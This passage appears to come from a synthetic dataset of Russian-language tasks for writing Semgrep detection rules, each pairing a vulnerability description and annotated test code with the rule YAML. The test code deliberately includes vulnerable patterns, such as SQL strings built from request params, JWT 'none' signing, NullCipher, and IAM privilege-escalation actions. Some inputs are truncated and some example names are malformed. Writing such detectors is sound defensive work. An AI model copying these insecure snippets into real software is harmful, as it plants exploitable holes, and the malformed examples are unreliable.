    "instruction": "Создай правило Semgrep для обнаружения no-iam-priv-esc-funcs\nОписание уязвимости: Ensure that actions that can result in privilege escalation are not used. These actions could potentially result in an attacker gaining full administrator access of an AWS account. Try not to use these actions.\nCWE: CWE-250: Execution with Unnecessary Privileges\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-250: Execution with Unnecessary Privileges\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: no-iam-priv-esc-funcs.tf\nresource \"aws_iam_user_policy\" \"lb_ro\" {\n  name = \"test\"\n  user = aws_iam_user.lb.name\n\n  # Terraform's \"jsonencode\" function converts a\n  # Terraform expression result to valid JSON syntax.\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ok: no-iam-priv-esc-funcs\n        Action = [\n          \"std:AssumeRole\",\n        ]\n        Effect   = \"Allow\"\n        Resource = [\"arn:aws:iam::ACCOUNT-ID-WITHOUT-HYPHENS:user/${aws.username}\"]\n      },\n    ]\n  })\n}\n\nresource \"aws_iam_policy\" \"lb_ro\" {\n  name = \"test\"\n  user = aws_iam_user.lb.name\n\n  # Terraform's \"jsonencode\" function converts a\n  # Terraform expression result to valid JSON syntax.\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ok: no-iam-priv-esc-funcs\n        Action = [\n          \"ec2:Describe\",\n        ]\n        Effect   = \"Allow\"\n        Resource = [\"*\"]\n      },\n    ]\n  })\n}\n\ndata aws_iam_policy_document \"policy\" {\n   statement {\n     # ok: no-iam-priv-esc-funcs\n     actions = [\"ec2:Describe\"]\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"*\"]\n     }\n     resources = [\"*\"]\n   }\n}\n\nresource \"aws_iam_user_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  # Terraform's \"jsonencode\" function converts a\n  # Terraform expression result to valid JSON syntax.\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ruleid: no-iam-priv-esc-funcs\n        Action = \"iam:PutGroupPolicy\"\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n    ]\n  })\n}\n\nresource \"aws_iam_policy\" \"policy\" {\n  name        = \"test_policy\"\n  path        = \"/\"\n  description = \"My test policy\"\n\n  # Terraform's \"jsonencode\" function converts a\n  # Terraform expression result to valid JSON syntax.\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        # ruleid: no-iam-priv-esc-funcs\n        Action  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_iam_user_policy\" \"policy\" { \n  name = \"test_policy\"\n  path = \"/\"\n  description = \"My test policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Act\n• resource \"aws_iam_policy\" \"policy\" { \n  name = \"test_policy\"\n  path = \"/\"\n  description = \"My test policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action =\n• data aws_iam_policy_document \"policy\" { \n  statement {\n    actions = [\"glue:*\"]\n    principals {\n      type = \"AWS\"\n      identifiers = [\"*\"]\n    }\n    resources = [\"*\"]\n  }\n}\n\nБезопасные паттерны:  \n• resource \"aws_iam_user_policy\" \"lb_ro\" { \n  name = \"test\"\n  user = aws_iam_user.name\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = [\"std:AssumeRole\"],\n \n• resource \"aws_iamam\" \"lb_ro\" { \n  name = \"test\"\n  user = aws_iam_user.lb.name\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = [\"ec2:Describe\"],\n        Ef\n• data aws_iam_policy_policy \"policy\" { \n  statement {\n    actions = [\"ec2:Describe\"]\n    principals {\n      type = \"AWS\"\n      identifiers = [\"*\"]\n    }\n    resources = [\"*\"]\n  }\n}\n\nЛегенда аннотаций:\n- // ruleid:no-iam-priv-esc-funcs: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:no-iam-priv-esc-funcs: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: no-iam-priv-esc-funcs\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-inside: |\n          resource $TYPE \"...\" {\n            ...\n            policy = jsonencode({\n              ...\n              Statement = [\n                ...\n              ]\n              ...\n            })\n            ...\n          }\n      - pattern-not-inside: |\n          resource $TYPE \"...\" {\n            ...\n            policy = jsonencode({\n              ...\n              Statement = [\n                ...,\n                {... Effect = \"Deny\" ...},\n                ...\n              ]\n              ...\n            })\n            ...\n          }\n      - pattern: Action = $ACTION\n      - metavariable-pattern:\n          metavariable: $TYPE\n          pattern-either:\n          - pattern: |\n              \"aws_iam_role_policy\"\n          - pattern: |\n              \"aws_iam_policy\"\n          - pattern: |\n              \"aws_iam_user_policy\"\n          - pattern: |\n              \"aws_iam_group_policy\"\n    - patterns:\n      - pattern-inside: |\n          data aws_iam_policy_document \"...\" {\n            ...\n            statement {\n              ...\n            }\n            ...\n          }\n      - pattern-not-inside: |\n          data aws_iam_policy_document \"...\" {\n            ...\n            statement {\n              ...\n              effect = \"Deny\"\n              ...\n            }\n            ...\n          }\n      - pattern: |\n          actions = [..., $ACTION, ...]\n  - metavariable-pattern:\n      metavariable: $ACTION\n      pattern-either:\n      - pattern: |\n          \"iam:AddUserToGroup\"\n      - pattern: |\n          \"iam:CreatePolicyVersion\"\n      - pattern: |\n          \"iam:SetDefaultPolicyVersion\"\n      - pattern: |\n          \"iam:AttachUserPolicy\"\n      - pattern: |\n          \"iam:AttachGroupPolicy\"\n      - pattern: |\n          \"iam:AttachRolePolicy\"\n      - pattern: |\n          \"iam:PutUserPolicy\"\n      - pattern: |\n          \"iam:PutGroupPolicy\"\n      - pattern: |\n          \"iam:PutRolePolicy\"\n      - pattern: |\n          \"glue:UpdateDevEndpoint\"\n      - pattern: |\n          \"iam:*\"\n      - pattern: |\n          \"glue:*\"\n  message: >-\n    Ensure that actions that can result in privilege escalation are not used.\n    These actions could potentially result in an attacker gaining full administrator access of an AWS\n    account.\n    Try not to use these actions.\n  metadata:\n    references:\n    - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\n    - https://cloudsplaining.readthedocs.io/en/latest/glossary/privilege-escalation/\n    category: security\n    cwe:\n    - 'CWE-250: Execution with Unnecessary Privileges'\n    technology:\n    - terraform\n    - aws\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функций AWS IAM, которые могут привести к эскалации привилегий. Анализ выполняется путем поиска ресурсов или данных, использующих политику JSON, созданную функцией jsonencode, внутри которых указаны действия IAM. Правило проверяет наличие действий, таких как создание, изменение и присоединение политик пользователей, групп и ролей, а также управление политиками сервисов Glue. Если обнаруживаются такие действия без явного указания эффекта Deny, то генерируется предупреждение о потенциальной угрозе эскалации привилегий.\n\n# Ключевые элементы:\n- ID: no-iam-priv-esc-funcs\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "no-iam-priv-esc-funcs",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: tainted-sql-string\nОписание уязвимости: Detected user input used to manually construct a SQL string. This is usually bad practice because manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection to steal or modify contents of the database. Instead, use a parameterized query which is available by default in most database engines. Alternatively, consider using an object-relational mapper (ORM) such as ActiveRecord which will protect your queries.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-sql-string.rb\nclass UsersController < ApplicationController\n  skip_before_action :has_info\n  skip_before_action :authenticated, only: [:new, :create]\n\n  def new\n    @user = User.new\n  end\n\n\n  def update1\n    message = false\n    # ruleid:tainted-sql-string\n    user = User.find(:first, :conditions => \"user_id = '#{params[:user][:user_id]}'\")\n    user.skip_user_id_assign = true\n    user.update_attributes(params[:user].reject { |k| k == (\"password\" || \"password_confirmation\") || \"user_id\" })\n    pass = params[:user][:password]\n    user.password = pass if !(pass.blank?)\n    message = true if user.save!\n    respond_to do |format|\n      format.html { redirect_to user_account_settings_path(:user_id => current_user.user_id) }\n      format.json { render :json => {:msg => message ? \"success\" : \"false \"} }\n    end\n  end\n\n\n  def update2\n    message = false\n\n    # ruleid:tainted-sql-string\n    user = User.where(\"user_id = '#{params[:user][:id]}'\")[0]\n\n    if user\n      user.update_attributes(user_params_without_password)\n      if params[:user][:password].present? && (params[:user][:password] == params[:user][:password_confirmation])\n        user.password = params[:user][:password]\n      end\n      message = true if user.save!\n      respond_to do |format|\n        format.html { redirect_to user_account_settings_path(user_id: current_user.id) }\n        format.json { render json: {msg: message ? \"success\" : \"false \"} }\n      end\n    else\n      flash[:error] = \"Could not update user!\"\n      redirect_to user_account_settings_path(user_id: current_user.id)\n    end\n  end\n\n  def test3\n    # ruleid:tainted-sql-string\n    records = ActiveRecord::Base.connection.execute(\"INSERT INTO person (name) VALUES ('%s')\" % params[:user])\n    redirect_to '/'\n  end\n\n  def test4\n    # ruleid:tainted-sql-string\n    records = ActiveRecord::Base.connection.execute(Kernel::sprintf(\"SELECT FROM person WHERE name='%s'\", params[:user]))\n    redirect_to '/'\n  end\n\n  def test5\n    # ruleid:tainted  # Ограничиваем длину\n\nОпасные паттерны:\n• user = User.find(:first, :conditions => \"user_id = '\" + params[:user][:user_id] + \"'\" )\n• records = ActiveRecord::Base.connection.execute(\"INSERT INTO person (name) VALUES ('%s')\" % params[:user])\n• records = ActiveRecord::Base.connection.execute(Kernel::sprintf(\"SELECT FROM person WHERE name='%s'\", params[:user]))\n\nБезопасные паттерны:  \n• user = User.where('user_id = ?', params[:user][:id])[0]\n• user = User.where(user_id: params[:user_id])[0]\n• user = User.where(params.slice(:user_id))[0]\n\nЛегенда аннотаций:\n- // ruleid:tainted-sql-string: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-sql-string: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-sql-string\n  languages:\n  - ruby\n  severity: ERROR\n  message: Detected user input used to manually construct a SQL string. This is usually bad practice because\n    manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection\n    to steal or modify contents of the database. Instead, use a parameterized query which is available\n    by default in most database engines. Alternatively, consider using an object-relational mapper (ORM)\n    such as ActiveRecord which will protect your queries.\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - rails\n    references:\n    - https://rorsecurity.info/portfolio/ruby-on-rails-sql-injection-cheat-sheet\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: params\n      - pattern: request\n  pattern-sanitizers:\n  - pattern: |\n      $PARAMS.slice(...)\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - patterns:\n            - pattern: |\n                $RECORD.where($X,...)\n\n          - pattern: |\n              $RECORD.find(..., :conditions => $X,...)\n        - focus-metavariable: $X\n      - patterns:\n        - pattern: |\n            \"$SQLVERB#{$EXPR}...\"\n        - pattern-not-inside: |\n            $FUNC(\"...\",  \"...#{$EXPR}...\",...)\n        - focus-metavariable: $SQLVERB\n        - pattern-regex: (?i)(select|delete|insert|create|update|alter|drop)\\b\n      - patterns:\n        - pattern-either:\n          - pattern: Kernel::sprintf(\"$SQLSTR\", $EXPR)\n          - pattern: |\n              \"$SQLSTR\" + $EXPR\n          - pattern: |\n              \"$SQLSTR\" % $EXPR\n        - pattern-not-inside: |\n            $FUNC(\"...\",  \"...#{$EXPR}...\",...)\n        - focus-metavariable: $EXPR\n        - metavariable-regex:\n            metavariable: $SQLSTR\n            regex: (?i)(select|delete|insert|create|update|alter|drop)\\b\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования untrusted user input при построении SQL-запросов вручную. Источниками потенциально загрязненного ввода являются параметры запроса (params) и HTTP-запроса (request). Синиками считаются конструкции, содержащие динамически формируемые SQL-команды, такие как where, find или execute, а также методы sprintf и конкатенации строк с использованием переменных, содержащих пользовательский ввод. Правило учитывает исключения, когда используется метод slice для фильтрации параметров перед передачей их в запрос.\n\n# Ключевые элементы:\n- ID: tainted-sql-string\n- Язык: ruby \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-sql-string",
      "language": "ruby",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: no-null-cipher\nОписание уязвимости: NullCipher was detected. This will not encrypt anything; the cipher text will be the same as the plain text. Use a valid, secure cipher: Cipher.getInstance(\"AES/CBC/PKCS7PADDING\"). See https://owasp.org/www-community/Using_the_Java_Cryptographic_Extensions for more information.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: kt",
    "input": "Требования:\n- Язык: kt\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: no-null-cipher.kt\nimport java.lang.Runtime\n\nclass Cls {\n    public fun test1(plainText: String): Array<Byte> {\n        // ruleid: no-null-cipher\n        val doNothingCipher: Cipher = NullCipher()\n        //The ciphertext produced will be identical to the plaintext.\n        val cipherText: Cipher = doNothingCihper.doFinal(plainText)\n        return cipherText\n    }\n\n    public fun test2(plainText: String): Void {\n        // ok: no-null-cipher\n        val cipher: Cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\")\n        val cipherText: Array<Byte> = cipher.doFinal(plainText)\n        return cipherText\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• val doNothingCipher: Cipher = NullCipher()\n• val doNothingCihper: Cipher = NullCipher(); val cipherText: Cipher = doNothingCihper.doFinal(plainText)\n\nБезопасные паттерны:  \n• val cipher: Cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\")\n• val cipher: Cipher = Cipher.getInstance(\"AES/CBC/PKCS7PADDING\")\n\nЛегенда аннотаций:\n- // ruleid:no-null-cipher: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:no-null-cipher: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: no-null-cipher\n  pattern: NullCipher(...)\n  metadata:\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#NULL_CIPHER\n    asvs:\n      section: V6 Stored Cryptography Verification Requirements\n      control_id: 6.2.5 Insecure Algorithm\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x14-V6-Cryptography.md#v62-algorithms\n      version: '4'\n    category: security\n    technology:\n    - kotlin\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  message: 'NullCipher was detected. This will not encrypt anything; the cipher text will be the same\n    as the plain text. Use a valid, secure cipher: Cipher.getInstance(\"AES/CBC/PKCS7PADDING\"). See https://owasp.org/www-community/Using_the_Java_Cryptographic_Extensions\n    for more information.'\n  severity: WARNING\n  languages:\n  - kt\n  - scala\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования класса NullCipher в Kotlin-коде. Паттерн ищет вызов конструктора класса NullCipher(). Правило применимо только к Kotlin и Scala языкам программирования. Пример опасного кода демонстрирует создание экземпляра NullCipher, который не выполняет шифрование и возвращает открытый текст в виде зашифрованного текста. Безопасный пример показывает корректное использование метода Cipher.getInstance с безопасным алгоритмом шифрования.\n\n# Ключевые элементы:\n- ID: no-null-cipher\n- Язык: kt \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "no-null-cipher",
      "language": "kt",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: jwt-go-none-algorithm\nОписание уязвимости: Detected use of the 'none' algorithm in a JWT token. The 'none' algorithm assumes the integrity of the token has already been verified. This would allow a malicious actor to forge a JWT token that will automatically be verified. Do not explicitly use the 'none' algorithm. Instead, use an algorithm such as 'HS256'.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: jwt-none-alg.go\npackage main\n\nimport (\n    \"fmt\"\n    \"github.com/dgrijalva/jwt-go\"\n)\n\nfunc bad1() {\n    claims := jwt.StandardClaims{\n        ExpiresAt: 15000,\n        Issuer:    \"test\",\n    }\n\n    // ruleid: jwt-go-none-algorithm\n    token := jwt.NewWithClaims(jwt.SigningMethodNone, claims)\n    // ruleid: jwt-go-none-algorithm\n    ss, err := token.SignedString(jwt.UnsafeAllowNoneSignatureType)\n    fmt.Printf(\"%v %v\\n\", ss, err)\n}\n\nfunc ok1(key []byte) {\n    claims := jwt.StandardClaims{\n        ExpiresAt: 15000,\n        Issuer:    \"test\",\n    }\n\n    // ok: jwt-go-none-algorithm\n    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n    ss, err := token.SignedString(key)\n    fmt.Printf(\"%v %v\\n\", ss, err)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• token := jwt.NewWithClaims(jwt.SigningMethodNone, claims)\n• ss, err := token.SignedString(jwt.UnsafeAllowNoneSignatureType)\n\nБезопасные паттерны:  \n• token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n• ss, err := token.SignedString(key)\n\nЛегенда аннотаций:\n- // ruleid:jwt-go-none-algorithm: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:jwt-go-none-algorithm: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: jwt-go-none-algorithm\n  message: >-\n    Detected use of the 'none' algorithm in a JWT token.\n    The 'none' algorithm assumes the integrity of the token has already\n    been verified. This would allow a malicious actor to forge a JWT token\n    that will automatically be verified. Do not explicitly use the 'none'\n    algorithm. Instead, use an algorithm such as 'HS256'.\n  metadata:\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    category: security\n    technology:\n    - jwt\n    confidence: HIGH\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  languages: [go]\n  severity: ERROR\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        import \"github.com/golang-jwt/jwt\"\n        ...\n    - pattern-inside: |\n        import \"github.com/dgrijalva/jwt-go\"\n        ...\n  - pattern-either:\n    - pattern: |\n        jwt.SigningMethodNone\n    - pattern: jwt.UnsafeAllowNoneSignatureType\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма подписи JWT с методом 'none'. Алгоритм 'none' предполагает, что целостность токена уже проверена, что позволяет злоумышленнику подделать JWT-токен, который автоматически будет считаться действительным. Правило использует шаблон внутри импортов пакетов 'github.com/golang-jwt/jwt' и 'github.com/dgrijalva/jwt-go', а затем ищет явное указание метода подписи 'jwt.SigningMethodNone' или константы 'jwt.UnsafeAllowNoneSignatureType'. Это правило применимо только к языку Go.\n\n# Ключевые элементы:\n- ID: jwt-go-none-algorithm\n- Язык: go \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "jwt-go-none-algorithm",
      "language": "go",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: wp-ajax-no-auth-and-auth-hooks-audit\nОписание уязвимости: These hooks allow the developer to handle the custom AJAX endpoints.\"wp_ajax_$action\" hook get fires for any authenticated user and \"wp_ajax_nopriv_$action\" hook get fires for non-authenticated users.\nCWE: CWE-285: Improper Authorization\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-285: Improper Authorization\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wp-ajax-no-auth-and-auth-hooks-audit.php\n<?php\n\n// ruleid: wp-ajax-no-auth-and-auth-hooks-audit\nadd_action( 'wp_ajax_priv_upload', 'auth_upload' );\n\n// ruleid: wp-ajax-no-auth-and-auth-hooks-audit\nadd_action( 'wp_ajax_nopriv_upload', 'no_auth_upload');\n\n// ok: wp-ajax-no-auth-and-auth-hooks-audit\nadd_action('plugins_loaded','upload_plugins_loaded');\n\n\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• add_action( 'wp_ajax_priv_upload', 'auth_upload' );\n• add_action( 'wp_ajax_nopriv_upload', 'no_auth_upload');\n\nБезопасные паттерны:  \n• add_action('plugins_loaded','upload_plugins_loaded');\n\nЛегенда аннотаций:\n- // ruleid:wp-ajax-no-auth-and-auth-hooks-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wp-ajax-no-auth-and-auth-hooks-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: wp-ajax-no-auth-and-auth-hooks-audit\n    patterns:\n      - pattern: add_action($HOOK,...)\n      - metavariable-regex:\n          metavariable: $HOOK\n          regex: \"'wp_ajax_.*'\"\n    message: >-\n      These hooks allow the developer to handle the custom AJAX\n      endpoints.\"wp_ajax_$action\" hook get fires for any authenticated user and\n      \"wp_ajax_nopriv_$action\" hook get fires for non-authenticated users.\n    paths:\n      include:\n        - '**/wp-content/plugins/**/*.php'\n    languages:\n      - php\n    severity: WARNING\n    metadata:\n      category: security\n      confidence: LOW\n      likelihood: LOW\n      impact: MEDIUM\n      subcategory:\n        - audit\n      technology:\n        - Wordpress Plugins\n      references:\n        - https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#authorisation\n        - https://developer.wordpress.org/reference/hooks/wp_ajax_action/\n      owasp: \n        - A01:2021 - Broken Access Control\n      cwe: \n        - \"CWE-285: Improper Authorization\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования хуков 'add_action' в PHP-коде WordPress, которые соответствуют шаблону 'wp_ajax_' или 'wp_ajax_nopriv_'. Такие хуки позволяют разработчикам обрабатывать пользовательские конечные точки AJAX и могут привести к неправильной авторизации, позволяя аутентифицированным и неаутентифицированным пользователям выполнять действия, предназначенные только для определенных групп пользователей.\n\n# Ключевые элементы:\n- ID: wp-ajax-no-auth-and-auth-hooks-audit\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wp-ajax-no-auth-and-auth-hooks-audit",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: gcp-gke-sql-backup-configuration-enabled\nОписание уязвимости: Ensure all Cloud SQL database instance have backup configuration enabled\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-gke-sql-backup-configuration-enabled.tf\n# fail\n# ruleid: gcp-gke-sql-backup-configuration-enabled\nresource \"google_sql_database_instance\" \"fail\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n  }\n}\n\n# ok: gcp-gke-sql-backup-configuration-enabled\nresource \"google_sql_database_instance\" \"success\" {\n  database_version = \"MYSQL_8_0\"\n  name             = \"instance\"\n  region           = \"us-central1\"\n  settings {\n    tier = \"db-f1-micro\"\n    backup_configuration {\n        enabled = true\n        start_time = \"17:00\"\n    }\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_sql_database_instance\" \"fail\" { ... }\n• resource \"google_sql_database_instance\" \"another_fail\" { settings { ... } }\n\nБезопасные паттерны:  \n• resource \"google_sql_database_instance\" \"success\" { settings { backup_configuration { enabled = true ... } } }\n• resource \"google_sql_database_instance\" \"safe\" { settings { backup_configuration { enabled = true ... } } }\n\nЛегенда аннотаций:\n- // ruleid:gcp-gke-sql-backup-configuration-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-gke-sql-backup-configuration-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-gke-sql-backup-configuration-enabled\n  patterns:\n    - pattern: resource\n    - pattern-inside: |\n          resource \"google_sql_database_instance\" \"...\" {\n          ...\n          }\n    - pattern-not-inside: |\n          resource \"google_sql_database_instance\" \"...\" {\n          ...\n          settings {\n            ...\n            backup_configuration {\n              ...\n              enabled = true\n              ...\n            }\n            ...\n          }\n          ...\n          }\n  message: >-\n    Ensure all Cloud SQL database instance have backup configuration enabled\n  metadata:\n    category: best-practice\n    technology:\n      - terraform\n      - gcp\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Google Cloud SQL инстансов, у которых не включена опция резервного копирования. Анализ выполняется путем поиска шаблона ресурса Google Cloud SQL с отсутствующим блоком 'backup_configuration' или с установленным значением 'enabled = false'. Правило использует конструкцию pattern-inside для нахождения полного определения ресурса и pattern-not-inside для исключения случаев, когда резервное копирование уже включено.\n\n# Ключевые элементы:\n- ID: gcp-gke-sql-backup-configuration-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-gke-sql-backup-configuration-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: positive-number-index-of\nОписание уязвимости: Flags scala code that look for values that are greater than 0. This ignores the first element, which is most likely a bug. Instead, use indexOf with -1. If the intent is to check the inclusion of a value, use the contains method instead.\nCWE: \nТип анализа: search\nЯзык: scala",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: positive-number-index-of.scala\nclass Test {\n   def bad1(){\n      val color = \"blue\"\n      val strings = List(\"blue\", \"bob\")\n      // ruleid: positive-number-index-of\n      if(strings.indexOf(color) > 0){\n         println(\"This is if statement\");\n      }\n   }\n\n   def bad2(){\n      val name = \"bob\"\n      // ruleid: positive-number-index-of\n      if(name.indexOf(\"b\") > 2){\n         println(\"This is if statement\");\n      }\n   }\n\n   def ok1() {\n      val color = \"blue\"\n      val strings = List(\"blue\", \"bob\")\n      // ok: positive-number-index-of\n      if(strings.indexOf(color) > -1){\n         println(\"This is if statement\");\n      }\n   }\n\n   def ok2(){\n      val name = \"bob\"\n      // ok: positive-number-index-of\n      if(name.indexOf(\"b\") >= 0){\n         println(\"This is if statement\");\n      }\n   }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• if(strings.indexOf(color) > 0){\n• if(name.indexOf(\"b\") > 2){\n\nБезопасные паттерны:  \n• if(strings.indexOf(color) > -1){\n• if(name.indexOf(\"b\") >= 0){\n\nЛегенда аннотаций:\n- // ruleid:positive-number-index-of: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:positive-number-index-of: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: positive-number-index-of\n    metadata:\n      category: correctness\n      technology:\n        - scala\n      references:\n        - https://blog.codacy.com/9-scala-security-issues/\n      confidence: MEDIUM\n    message: >-\n      Flags scala code that look for values that are greater than 0. This ignores the first element, which is most likely a\n      bug. Instead, use indexOf with -1. If the intent is to check the inclusion of a value, use the contains method instead.\n    severity: WARNING\n    languages:\n      - scala\n    patterns:\n      - pattern-either:\n          - patterns:\n              - pattern: |\n                  $OBJ.indexOf(...) > $VALUE\n              - metavariable-comparison:\n                  metavariable: $VALUE\n                  comparison: $VALUE >= 0\n          - patterns:\n              - pattern: |\n                  $OBJ.indexOf(...) >= $SMALLERVAL\n              - metavariable-comparison:\n                  metavariable: $SMALLERVAL\n                  comparison: $SMALLERVAL > 0\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода indexOf в Scala с параметром, большим нуля. Такой подход игнорирует первый элемент списка или строки, что может быть ошибкой программирования. Правило ищет выражения вида obj.indexOf(выражение) > значение, где значение больше нуля, и obj.indexOf(выражение) >= меньшее_значение, где 